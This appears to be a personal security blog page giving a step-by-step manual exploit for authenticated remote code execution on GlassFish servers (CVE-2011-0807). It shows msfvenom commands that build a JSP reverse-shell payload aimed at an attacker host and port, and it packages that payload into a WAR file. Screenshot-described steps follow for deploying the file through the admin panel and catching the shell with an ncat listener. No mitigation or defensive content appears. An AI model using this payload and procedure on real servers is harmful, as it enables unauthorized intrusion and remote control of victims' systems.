---
layout: default
title : nighthawk - Glassfish - Authenticated RCE Manual exploit
---

### Description
This module logs in to an GlassFish Server 3.1 (Open Source or Commercial) instance using a default credential, uploads, and executes commands via deploying a malicious WAR.  On Glassfish 2.x, 3.0 and Sun Java System Application Server 9.x. 

### CVE
CVE-2011-0807

### Steps to exploit

```shell
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Glassfish]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.139.10 LPORT=5566 -f raw -o shell.jsp   
Payload size: 1499 bytes
Saved as: shell.jsp
                                                                                                                                                            
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Glassfish]
└─$ mkdir shell                                                                              
                                                                                                                                                            
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Glassfish]
└─$ cp shell.jsp shell                                        
                                                                                                                                                            
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Glassfish]
└─$ cd shell          
                                                                                                                                                            
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Glassfish/shell]
└─$ jar -cvf ../shell.war *
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
added manifest
adding: shell.jsp(in = 1499) (out= 587)(deflated 60%)
                                                                                                                                                            
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Glassfish/shell]
└─$ cd ../                
                                                                                                                                                            
┌──(n16hth4wk👽n16hth4wk-sec)-[~/Glassfish]
└─$ ls                    
shell  shell.jsp  shell.war
```

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/fd63d2c9-b5fe-450d-8347-61b526778408)

Glassfish 3.1.3

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/0d77f179-3c5a-436a-90a9-e9897ffbe5f6)

login to the admin panel and click on deploy an application 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/f0076c46-d4c1-460c-9e91-770e0f214a86)

upload the war shell file we created earlier and click ok to upload 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3864d48b-aaed-4c58-bbb5-02a3bb2c1a46)

click launch to launch the appliication and start your listener on ncat

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/6230eb44-1cd9-40a9-8bcb-825b6fbeeb92)

click on the link to trigger the shell

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/4a64396d-0584-467b-b099-23b6b6b79b13)

check back your listener 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/9e4c52bd-8986-4746-a151-ccbbf1cb3059)

we got a reverse shell. and we are through 🙂 easy huh?
